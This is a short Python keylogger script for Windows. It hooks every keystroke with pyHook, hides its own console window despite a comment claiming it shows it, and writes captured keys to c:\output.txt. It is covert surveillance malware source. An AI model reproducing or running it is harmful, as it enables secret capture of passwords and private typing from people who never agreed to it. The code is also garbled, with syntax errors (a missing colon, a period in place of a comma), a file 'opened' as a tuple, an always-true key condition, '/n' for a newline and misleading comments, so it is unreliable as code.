#walk to the library, obtain the books to create the python application

import win32api
import win32console
import win32gui
import pythoncom, pyHook#pyHook is a class library for the keyboard

#Show the Console Window on the screen
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event):

    if event.Ascii==5#if type 5 then dont do anything
        _exit(1)
    
    if event.Ascii !=0 or 8:#if use press on great or equal 0 or press 8 
        f = open("c:\output.txt". "r+")#creating a file and location of file and imput the keyboard text

        buffer = f.read()#then you will read the file

        f.close()#then you will close the file

    #reopen the file for whe the user starts typing again on the keyboard
        f = ("c:\output.txt", "w")

        keylogs = chr(event.Ascii)

        if event.Ascii == 13:#if the user types 13

            keylogs = '/n' #start a new line in the text file

            buffer += keylogs
            f.write(buffer)
            f.close()

#Create a hook for the manager object

hm = pyHook.HookManager()#referencing the class library the was implemented
hm.KeyDown = OnKeyboardEvent#every time you press down on the keyboard, run the function of logging the events in a text file

#set the hook
hm.HookKeyboard()

#wait forever
pythoncom.PumpMessages()
